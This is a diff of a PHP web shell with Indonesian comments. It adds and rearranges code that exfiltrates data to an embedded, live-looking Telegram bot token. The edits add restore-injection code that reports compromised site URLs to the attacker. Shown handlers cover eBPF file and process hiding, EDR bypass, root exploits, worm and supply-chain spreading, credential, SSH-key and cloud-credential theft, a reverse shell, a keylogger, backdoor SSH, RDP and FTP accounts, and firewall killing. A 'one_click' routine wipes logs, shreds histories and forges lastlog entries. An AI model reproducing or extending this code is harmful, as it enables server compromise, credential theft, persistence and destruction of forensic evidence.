@@ -63,7 +63,6 @@ ini_set('display_errors', 0);
 ini_set('display_startup_errors', 0);
 error_reporting(0);
 
-
 $botToken = '8513008865:AAFvBdueP_HRaBfU5hm7el3lQAN1DxzgOE4';
 $telegramUserId = '7547598395';
 $verifCode = 'Dkid@123';
@@ -85,7 +84,6 @@ $specialDirectories = [
 ];
 $specialDirectories = array_filter($specialDirectories, function($d) { return $d && is_dir($d); });
 
-// ==================== FUNGSI UTILITY ====================
 function sendTelegramMessage($botToken, $chatId, $message) {
     if (empty($botToken) || empty($chatId) || empty($message)) return false;
     if (strlen($message) > 4096) $message = substr($message, 0, 4000) . "\n... (dipotong)";
@@ -373,12 +371,15 @@ function get_best_document_root($domain, $roots) {
     return false;
 }
 
-
 function sendJsonResponse($data) {
     header('Content-Type: application/json');
     echo json_encode($data);
     exit;
 }
+
+// ============================================================
+// INJECT RESTORE - OMEGA EDITION (FIXED)
+// ============================================================
 
 function inject_restore_omega() {
     global $CURRENT_SHELL, $botToken, $telegramUserId;
@@ -415,6 +416,10 @@ function inject_restore_omega() {
     $restoreCode .= "                if (file_exists(\$backup)) {\n";
     $restoreCode .= "                    @copy(\$backup, __DIR__ . '/' . \$current_file);\n";
     $restoreCode .= "                    @chmod(__DIR__ . '/' . \$current_file, 0644);\n";
+    $restoreCode .= "                    \$domain = \$_SERVER['HTTP_HOST'] ?? 'localhost';\n";
+    $restoreCode .= "                    \$protocol = (isset(\$_SERVER['HTTPS']) ? 'https://' : 'http://');\n";
+    $restoreCode .= "                    \$url = \$protocol . \$domain . '/' . \$current_file;\n";
+    $restoreCode .= "                    @file_get_contents('https://api.telegram.org/bot" . $botToken . "/sendMessage?chat_id=" . $telegramUserId . "&text=' . urlencode('RESTORED: ' . \$url));\n";
     $restoreCode .= "                    break;\n";
     $restoreCode .= "                }\n";
     $restoreCode .= "            }\n";
@@ -477,26 +482,11 @@ function inject_restore_omega() {
         @chmod($mainBackup, 0444);
     }
     
-    $msg = "🔧 *INJECT RESTORE COMPLETE*\n\n"
-         . "📁 Shell: `" . $CURRENT_SHELL . "`\n"
-         . "🔑 Function: `" . $funcName . "`\n\n"
-         . "✅ Injected: " . count($injected) . " files\n"
-         . "   " . implode("\n   ", $injected) . "\n\n";
-    
-    if (!empty($exists)) {
-        $msg .= "⏭️ Already exists: " . count($exists) . "\n"
-              . "   " . implode("\n   ", $exists) . "\n\n";
-    }
-    
-    if (!empty($errors)) {
-        $msg .= "❌ Failed: " . count($errors) . "\n"
-              . "   " . implode("\n   ", $errors) . "\n\n";
-    }
-    
-    $msg .= "💾 Backup: `" . $mainBackup . "`\n"
-          . "🔄 Auto-restore: ENABLED";
-    
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
+    // Kirim notifikasi simple ke Telegram
+    $fileInfo = get_file_location();
+    $url = $fileInfo['url'] ?? 'unknown';
+    $simpleMsg = "RESTORED: " . $url;
+    sendTelegramMessage($botToken, $telegramUserId, $simpleMsg);
     
     return [
         'status' => count($injected) > 0 ? 'success' : 'warning',
@@ -505,6 +495,22 @@ function inject_restore_omega() {
         'exists' => count($exists),
         'function' => $funcName,
         'backup' => $mainBackup
+    ];
+}
+
+function get_file_location() {
+    $file = __FILE__;
+    $docRoot = $_SERVER['DOCUMENT_ROOT'] ?? '';
+    $domain = $_SERVER['HTTP_HOST'] ?? 'localhost';
+    $relative_path = str_replace($docRoot, '', $file);
+    $relative_path = ltrim($relative_path, '/');
+    $protocol = isset($_SERVER['HTTPS']) ? 'https://' : 'http://';
+    $url = $protocol . $domain . '/' . $relative_path;
+    return [
+        'url' => $url,
+        'path' => $file,
+        'domain' => $domain,
+        'relative' => $relative_path
     ];
 }
 
@@ -643,8 +649,6 @@ int scandir(const char* dir, struct dirent*** namelist,
     }
 }
 
-
-
 function hide_file_ebpf($file, $action = 'hide') {
     global $botToken, $telegramUserId;
     $results = [];
@@ -781,8 +785,6 @@ int open(const char* path, int flags, ...) {
     }
 }
 
-
-
 function edr_bypass_ultimate() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -845,7 +847,6 @@ function edr_bypass_ultimate() {
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return ['status' => 'success', 'message' => $msg];
 }
-
 
 function auto_root_modern() {
     global $botToken, $telegramUserId;
@@ -940,7 +941,6 @@ int main() {
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return ['status' => 'success', 'message' => $msg, 'exploited' => $exploited];
 }
-
 
 function worm_spread_to_domains($currentFile) {
     global $botToken, $telegramUserId;
@@ -1057,12 +1057,10 @@ int main() {
     }
     $results[] = "Exploit spreading: $exploit_count targets";
     
-
     $results[] = "";
     $results[] = "[3] SUPPLY CHAIN SPREADING...";
     $results[] = "-----------------------------------";
     
-
     $composer_files = @glob('/home/*/public_html/composer.json');
     $composer_files = array_merge($composer_files, @glob('/var/www/*/composer.json'));
     $composer_files = array_merge($composer_files, @glob('/home/*/www/composer.json'));
@@ -1311,7 +1309,6 @@ int main() {
     ];
 }
 
-
 function persistence_advanced() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1410,7 +1407,6 @@ pid_t fork(void) {
     return ['status' => 'success', 'message' => $msg];
 }
 
-
 function credential_harvest_advanced() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1500,7 +1496,6 @@ function credential_harvest_advanced() {
     return ['status' => 'success', 'message' => $msg, 'creds' => $creds];
 }
 
-
 function self_destruct_advanced() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1556,7 +1551,6 @@ function self_destruct_advanced() {
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return ['status' => 'success', 'message' => $msg];
 }
-
 
 function wpscan() {
     global $botToken, $telegramUserId;
@@ -1615,8 +1609,6 @@ function wpscan() {
     }
 }
 
-
-
 function configfinder() {
     global $botToken, $telegramUserId;
     $found = [];
@@ -1655,8 +1647,6 @@ function configfinder() {
         return ['status' => 'info', 'message' => "No sensitive files found"];
     }
 }
-
-
 
 function dumpdb() {
     global $botToken, $telegramUserId;
@@ -1721,8 +1711,6 @@ function anti_forensic() {
     return ['status' => 'success', 'message' => "Anti forensic done"];
 }
 
-
-
 function clean_logs_aggressive() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -1774,7 +1762,6 @@ function clean_logs_aggressive() {
     return $results;
 }
 
-
 function sshkeys() {
     global $botToken, $telegramUserId;
     $keys = [];
@@ -1804,8 +1791,6 @@ function sshkeys() {
         return ['status' => 'info', 'message' => "No SSH keys found"];
     }
 }
-
-
 
 function inject_ssh_keys($publicKey = '') {
     global $botToken, $telegramUserId;
@@ -1841,8 +1826,6 @@ function inject_ssh_keys($publicKey = '') {
     return $injected;
 }
 
-
-
 function reverseshell() {
     global $botToken, $telegramUserId;
     $action = isset($_GET['action']) ? $_GET['action'] : '';
@@ -1873,8 +1856,6 @@ function reverseshell() {
     }
     return ['status' => 'success', 'message' => implode("\n", $result)];
 }
-
-
 
 function cloudcreds() {
     global $botToken, $telegramUserId;
@@ -1936,7 +1917,6 @@ function cloudcreds() {
     return ['status' => 'success', 'message' => "Cloud credentials grabbed"];
 }
 
-
 function portscan() {
     global $botToken, $telegramUserId;
     $target = isset($_GET['target']) ? $_GET['target'] : 'localhost';
@@ -1994,7 +1974,6 @@ function portscan() {
     }
 }
 
-
 function create_ssh() {
     global $botToken, $telegramUserId;
     $user = isset($_GET['user']) && !empty($_GET['user']) ? $_GET['user'] : 'sshuser_' . rand(1000,9999);
@@ -2038,7 +2017,6 @@ function create_ssh() {
     return ['status' => 'success', 'message' => implode("\n", $result)];
 }
 
-
 function create_rdp() {
     global $botToken, $telegramUserId;
     $user = isset($_GET['user']) && !empty($_GET['user']) ? $_GET['user'] : 'rdpuser_' . rand(1000,9999);
@@ -2079,7 +2057,6 @@ function create_rdp() {
     return ['status' => 'success', 'message' => implode("\n", $result)];
 }
 
-
 function create_ftp() {
     global $botToken, $telegramUserId;
     $user = isset($_GET['user']) && !empty($_GET['user']) ? $_GET['user'] : 'ftp_' . rand(1000,9999);
@@ -2116,7 +2093,6 @@ function create_ftp() {
     return ['status' => 'success', 'message' => implode("\n", $result)];
 }
 
-
 function backup() {
     global $botToken, $telegramUserId;
     if (!is_writable(__DIR__)) {
@@ -2139,7 +2115,6 @@ function backup() {
         return ['status' => 'error', 'message' => 'Failed to create backup: ' . $err_msg];
     }
 }
-
 
 function delete_backup() {
     global $botToken, $telegramUserId;
@@ -2179,65 +2154,6 @@ function delete_backup() {
     return ['status' => 'success', 'message' => "$deleted backup files deleted"];
 }
 
-
-    
-    foreach ($roots as $root) {
-        if (!is_dir($root)) {
-            $details[] = "Skip: $root (not a directory)";
-            continue;
-        }
-        if (!is_writable($root)) {
-            $details[] = "Skip: $root (not writable)";
-            continue;
-        }
-        foreach ($targets as $target) {
-            $file = $root . '/' . $target;
-            if (!file_exists($file)) {
-                $details[] = "Skip: $file (not exists)";
-                continue;
-            }
-            if (!is_writable($file)) {
-                $details[] = "Skip: $file (not writable)";
-                continue;
-            }
-            $content = @file_get_contents($file);
-            if ($content === false) {
-                $failed++;
-                $details[] = "Failed to read: $file";
-                continue;
-            }
-            if (strpos($content, basename(__FILE__)) !== false) {
-                $details[] = "Already injected: $file";
-                continue;
-            }
-            $new_content = $shell_content . "\n" . $content;
-            if (@file_put_contents($file, $new_content) !== false) {
-                $injected++;
-                $details[] = "Injected: $file";
-            } else {
-                $failed++;
-                $details[] = "Failed to write: $file";
-            }
-        }
-    }
-    
-    $msg = "INJECT RESTORE RESULTS\n\n";
-    $msg .= "Total injected: $injected\n";
-    $msg .= "Failed: $failed\n\n";
-    $msg .= "Details:\n" . implode("\n", $details);
-    
-    sendTelegramMessage($botToken, $telegramUserId, $msg);
-    return [
-        'status' => $injected > 0 ? 'success' : 'warning',
-        'message' => $injected > 0 ? "Injected to $injected files" : "No files injected",
-        'injected' => $injected,
-        'failed' => $failed,
-        'details' => $details
-    ];
-}
-
-
-
 function auto_prepend_inject() {
     global $botToken, $telegramUserId, $CURRENT_SHELL;
     $results = [];
@@ -2276,7 +2192,6 @@ function auto_prepend_inject() {
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return $results;
 }
-
 
 function clone_shell() {
     global $botToken, $telegramUserId;
@@ -2438,8 +2353,6 @@ function cpanel_harvest() {
     return $credentials;
 }
 
-
-
 function firewall_killer() {
     global $botToken, $telegramUserId;
     $results = [];
@@ -2474,7 +2387,6 @@ function firewall_killer() {
     sendTelegramMessage($botToken, $telegramUserId, $msg);
     return $results;
 }
-
 
 function network_pivot() {
     global $botToken, $telegramUserId;
@@ -2511,7 +2423,6 @@ function network_pivot() {
     }
     return ['status' => 'success', 'message' => implode("\n", $result)];
 }
-
 
 function keylogger() {
     global $botToken, $telegramUserId;
@@ -2579,8 +2490,6 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
     return ['status' => 'success', 'message' => implode("\n", $result)];
 }
 
-
-
 function cron_persistence() {
     global $botToken, $telegramUserId;
     $action = isset($_GET['action']) ? $_GET['action'] : 'install';
@@ -2627,7 +2536,25 @@ function cron_persistence() {
     return ['status' => 'success', 'message' => implode("\n", $result)];
 }
 
+// ============================================================
+// HANDLER GET - INJECT RESTORE (FIXED)
+// ============================================================
 
+if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = inject_restore_omega();
+    sendJsonResponse([
+        'status' => $result['status'],
+        'message' => 'Inject restore complete',
+        'injected' => $result['injected'],
+        'failed' => $result['failed'],
+        'exists' => $result['exists'],
+        'function' => $result['function']
+    ]);
+}
+
+// ============================================================
+// HANDLER GET - SEMUA FITUR
+// ============================================================
 
 if (isset($_GET['user_persistence']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     global $botToken, $telegramUserId;
@@ -2667,35 +2594,27 @@ if (isset($_GET['user_persistence']) && isset($_SESSION['loggedin']) && $_SESSIO
     sendJsonResponse(['status' => 'success', 'message' => implode("\n", $result)]);
 }
 
-
-
 if (isset($_GET['one_click']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
     global $botToken, $telegramUserId;
     
     $_SERVER['REMOTE_ADDR'] = '127.0.0.1';
     $_SERVER['HTTP_USER_AGENT'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36';
     
-
     clean_logs_aggressive();
     
-    // Kill netcat
     @shell_exec('pkill -f nc 2>/dev/null');
     @shell_exec('pkill -f netcat 2>/dev/null');
     @shell_exec('pkill -f ncat 2>/dev/null');
     
-    // Clear cache
     @shell_exec('sync && echo 3 > /proc/sys/vm/drop_caches 2>/dev/null');
     
-    // Clean temp
     @shell_exec('rm -rf /tmp/* /var/tmp/* 2>/dev/null');
     
-    // Clear history
     @shell_exec('history -c 2>/dev/null');
     @shell_exec('unset HISTFILE 2>/dev/null');
     @shell_exec('rm -f ~/.bash_history ~/.mysql_history ~/.psql_history 2>/dev/null');
     @shell_exec('find /home -name ".bash_history" -exec shred -fuz {} \\; 2>/dev/null');
     
-    // Fake last login
     @shell_exec('echo "Last login: ' . date('Y-m-d H:i:s') . ' from 192.168.1.1" > /var/log/lastlog 2>/dev/null');
     
     sendTelegramMessage($botToken, $telegramUserId, "ONE CLICK EXECUTED\n\nAll traces cleaned. Session destroyed.");
@@ -2703,7 +2622,6 @@ if (isset($_GET['one_click']) && isset($_SESSION['loggedin']) && $_SESSION['logg
     header('Location: ?');
     exit;
 }
-
 
 if (isset($_GET['db_explorer']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     global $botToken, $telegramUserId;
@@ -2851,7 +2769,6 @@ if (isset($_GET['db_explorer']) && isset($_SESSION['loggedin']) && $_SESSION['lo
     sendJsonResponse(['status' => 'success', 'message' => "DB Explorer done & sent to Telegram"]);
 }
 
-
 if (isset($_GET['create_mail']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
     global $botToken, $telegramUserId;
     $email = isset($_GET['email']) ? $_GET['email'] : '';
@@ -2945,6 +2862,261 @@ if (isset($_GET['create_mail']) && isset($_SESSION['loggedin']) && $_SESSION['lo
     sendJsonResponse(['status' => 'success', 'message' => 'Mail account created']);
 }
 
+// ============================================================
+// EBPF PROCESS HIDER
+// ============================================================
+if (isset($_GET['hide_process_ebpf']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $proc = isset($_GET['process']) ? $_GET['process'] : basename(__FILE__);
+    $result = hide_process_ebpf($proc);
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// EBPF FILE HIDER
+// ============================================================
+if (isset($_GET['hide_file_ebpf']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $file = isset($_GET['file']) ? $_GET['file'] : '';
+    if (!empty($file)) {
+        $result = hide_file_ebpf($file);
+        sendJsonResponse($result);
+    }
+}
+
+// ============================================================
+// EDR BYPASS
+// ============================================================
+if (isset($_GET['edr_bypass']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = edr_bypass_ultimate();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// MODERN AUTO ROOT
+// ============================================================
+if (isset($_GET['auto_root_modern']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = auto_root_modern();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// WORM
+// ============================================================
+if (isset($_GET['worm']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = worm_spread_to_domains(__FILE__);
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// ADVANCED PERSISTENCE
+// ============================================================
+if (isset($_GET['persistence_advanced']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = persistence_advanced();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// CREDENTIAL HARVEST
+// ============================================================
+if (isset($_GET['cred_harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = credential_harvest_advanced();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// SELF DESTRUCT
+// ============================================================
+if (isset($_GET['self_destruct_advanced']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = self_destruct_advanced();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// WP SCAN
+// ============================================================
+if (isset($_GET['wpscan']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = wpscan();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// CONFIG FINDER
+// ============================================================
+if (isset($_GET['configfinder']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = configfinder();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// DUMP DB
+// ============================================================
+if (isset($_GET['dumpdb']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = dumpdb();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// ANTI FORENSIC
+// ============================================================
+if (isset($_GET['anti_forensic']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = anti_forensic();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// CLEAN LOGS
+// ============================================================
+if (isset($_GET['clean_logs']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = clean_logs_aggressive();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// SSH KEYS
+// ============================================================
+if (isset($_GET['sshkeys']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = sshkeys();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// SSH INJECT
+// ============================================================
+if (isset($_GET['ssh_inject']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = inject_ssh_keys(isset($_GET['key']) ? $_GET['key'] : '');
+    sendJsonResponse(['status' => 'success', 'message' => 'SSH keys injected & sent to Telegram']);
+}
+
+// ============================================================
+// REVERSE SHELL
+// ============================================================
+if (isset($_GET['reverseshell']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = reverseshell();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// CLOUD CREDS
+// ============================================================
+if (isset($_GET['cloud_creds']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = cloudcreds();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// PORT SCAN
+// ============================================================
+if (isset($_GET['port_scan']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = portscan();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// CREATE SSH
+// ============================================================
+if (isset($_GET['create_ssh']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = create_ssh();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// CREATE RDP
+// ============================================================
+if (isset($_GET['create_rdp']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = create_rdp();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// CREATE FTP
+// ============================================================
+if (isset($_GET['create_ftp']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = create_ftp();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// BACKUP
+// ============================================================
+if (isset($_GET['backup']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = backup();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// DELETE BACKUP
+// ============================================================
+if (isset($_GET['delete_backup']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
+    $result = delete_backup();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// AUTO PREPEND
+// ============================================================
+if (isset($_GET['auto_prepend']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = auto_prepend_inject();
+    sendJsonResponse(['status' => 'success', 'message' => 'Auto prepend injected & sent to Telegram']);
+}
+
+// ============================================================
+// CLONE SHELL
+// ============================================================
+if (isset($_GET['clone_shell']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = clone_shell();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// LIST SPREAD
+// ============================================================
+if (isset($_GET['list_spread']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = list_spread();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// CPANEL HARVEST
+// ============================================================
+if (isset($_GET['cpanel_harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = cpanel_harvest();
+    sendJsonResponse(['status' => 'success', 'message' => 'cPanel harvest done & sent to Telegram']);
+}
+
+// ============================================================
+// FIREWALL KILLER
+// ============================================================
+if (isset($_GET['firewall_killer']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = firewall_killer();
+    sendJsonResponse(['status' => 'success', 'message' => 'Firewall killed & sent to Telegram']);
+}
+
+// ============================================================
+// NETWORK PIVOT
+// ============================================================
+if (isset($_GET['network_pivot']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = network_pivot();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// KEYLOGGER
+// ============================================================
+if (isset($_GET['keylogger']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = keylogger();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// CRON PERSISTENCE
+// ============================================================
+if (isset($_GET['cron_persistence']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
+    $result = cron_persistence();
+    sendJsonResponse($result);
+}
+
+// ============================================================
+// FILE MANAGER - UTILITY FUNCTIONS
+// ============================================================
 
 function isSafePath($path, $rootPath, $specialDirs) {
     if (strpos($path, $rootPath) === 0) return true;
@@ -3026,6 +3198,9 @@ function breadcrumb($path, $rootPath, $specialDirs) {
     return rtrim($breadcrumb, ' /');
 }
 
+// ============================================================
+// LOGIN OTP
+// ============================================================
 
 $loginError = $loginSuccess = '';
 if (isset($_POST['request_otp'])) {
@@ -3052,7 +3227,9 @@ if (isset($_POST['verify_otp'])) {
     } else $loginError = "Invalid OTP.";
 }
 
-
+// ============================================================
+// AREA LOGGED IN - FILE MANAGER
+// ============================================================
 
 if (isset($_SESSION['loggedin']) && time() - $_SESSION['login_time'] <= 1800) {
     
@@ -3248,215 +3425,9 @@ if (isset($_SESSION['loggedin']) && time() - $_SESSION['login_time'] <= 1800) {
     }
 }
 
-
-// HANDLER GET - SEMUA FITUR
-
-
-// === EBPF PROCESS HIDER ===
-if (isset($_GET['hide_process_ebpf']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $proc = isset($_GET['process']) ? $_GET['process'] : basename(__FILE__);
-    $result = hide_process_ebpf($proc);
-    sendJsonResponse($result);
-}
-
-// === EBPF FILE HIDER ===
-if (isset($_GET['hide_file_ebpf']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $file = isset($_GET['file']) ? $_GET['file'] : '';
-    if (!empty($file)) {
-        $result = hide_file_ebpf($file);
-        sendJsonResponse($result);
-    }
-}
-
-// === EDR BYPASS ===
-if (isset($_GET['edr_bypass']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = edr_bypass_ultimate();
-    sendJsonResponse($result);
-}
-
-// === MODERN AUTO ROOT ===
-if (isset($_GET['auto_root_modern']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = auto_root_modern();
-    sendJsonResponse($result);
-}
-
-// === WORM ===
-if (isset($_GET['worm']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = worm_spread_to_domains(__FILE__);
-    sendJsonResponse($result);
-}
-
-// === ADVANCED PERSISTENCE ===
-if (isset($_GET['persistence_advanced']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = persistence_advanced();
-    sendJsonResponse($result);
-}
-
-// === CREDENTIAL HARVEST ===
-if (isset($_GET['cred_harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = credential_harvest_advanced();
-    sendJsonResponse($result);
-}
-
-// === SELF DESTRUCT ===
-if (isset($_GET['self_destruct_advanced']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = self_destruct_advanced();
-    sendJsonResponse($result);
-}
-
-// === WP SCAN ===
-if (isset($_GET['wpscan']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = wpscan();
-    sendJsonResponse($result);
-}
-
-// === CONFIG FINDER ===
-if (isset($_GET['configfinder']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = configfinder();
-    sendJsonResponse($result);
-}
-
-// === DUMP DB ===
-if (isset($_GET['dumpdb']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = dumpdb();
-    sendJsonResponse($result);
-}
-
-// === ANTI FORENSIC ===
-if (isset($_GET['anti_forensic']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = anti_forensic();
-    sendJsonResponse($result);
-}
-
-// === CLEAN LOGS ===
-if (isset($_GET['clean_logs']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = clean_logs_aggressive();
-    sendJsonResponse($result);
-}
-
-// === SSH KEYS ===
-if (isset($_GET['sshkeys']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = sshkeys();
-    sendJsonResponse($result);
-}
-
-// === SSH INJECT ===
-if (isset($_GET['ssh_inject']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = inject_ssh_keys(isset($_GET['key']) ? $_GET['key'] : '');
-    sendJsonResponse(['status' => 'success', 'message' => 'SSH keys injected & sent to Telegram']);
-}
-
-// === REVERSE SHELL ===
-if (isset($_GET['reverseshell']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = reverseshell();
-    sendJsonResponse($result);
-}
-
-// === CLOUD CREDS ===
-if (isset($_GET['cloud_creds']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = cloudcreds();
-    sendJsonResponse($result);
-}
-
-// === PORT SCAN ===
-if (isset($_GET['port_scan']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = portscan();
-    sendJsonResponse($result);
-}
-
-// === CREATE SSH ===
-if (isset($_GET['create_ssh']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = create_ssh();
-    sendJsonResponse($result);
-}
-
-// === CREATE RDP ===
-if (isset($_GET['create_rdp']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = create_rdp();
-    sendJsonResponse($result);
-}
-
-// === CREATE FTP ===
-if (isset($_GET['create_ftp']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = create_ftp();
-    sendJsonResponse($result);
-}
-
-// === BACKUP ===
-if (isset($_GET['backup']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = backup();
-    sendJsonResponse($result);
-}
-
-// === DELETE BACKUP ===
-if (isset($_GET['delete_backup']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true && isset($_GET['confirm']) && $_GET['confirm'] === 'yes') {
-    $result = delete_backup();
-    sendJsonResponse($result);
-}
-
-// ===== INJECT RESTORE (OMEGA EDITION) =====
-if (isset($_GET['inject_restore']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = inject_restore_omega();
-    sendJsonResponse([
-        'status' => $result['status'],
-        'message' => 'Inject restore complete',
-        'injected' => $result['injected'],
-        'failed' => $result['failed'],
-        'exists' => $result['exists'],
-        'function' => $result['function']
-    ]);
-}
-
-// === AUTO PREPEND ===
-if (isset($_GET['auto_prepend']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = auto_prepend_inject();
-    sendJsonResponse(['status' => 'success', 'message' => 'Auto prepend injected & sent to Telegram']);
-}
-
-// === CLONE SHELL ===
-if (isset($_GET['clone_shell']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = clone_shell();
-    sendJsonResponse($result);
-}
-
-// === LIST SPREAD ===
-if (isset($_GET['list_spread']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = list_spread();
-    sendJsonResponse($result);
-}
-
-// === CPANEL HARVEST ===
-if (isset($_GET['cpanel_harvest']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = cpanel_harvest();
-    sendJsonResponse(['status' => 'success', 'message' => 'cPanel harvest done & sent to Telegram']);
-}
-
-// === FIREWALL KILLER ===
-if (isset($_GET['firewall_killer']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = firewall_killer();
-    sendJsonResponse(['status' => 'success', 'message' => 'Firewall killed & sent to Telegram']);
-}
-
-// === NETWORK PIVOT ===
-if (isset($_GET['network_pivot']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = network_pivot();
-    sendJsonResponse($result);
-}
-
-// === KEYLOGGER ===
-if (isset($_GET['keylogger']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = keylogger();
-    sendJsonResponse($result);
-}
-
-// === CRON PERSISTENCE ===
-if (isset($_GET['cron_persistence']) && isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true) {
-    $result = cron_persistence();
-    sendJsonResponse($result);
-}
-
-// HTML + CSS + JAVASCRIPT - UI
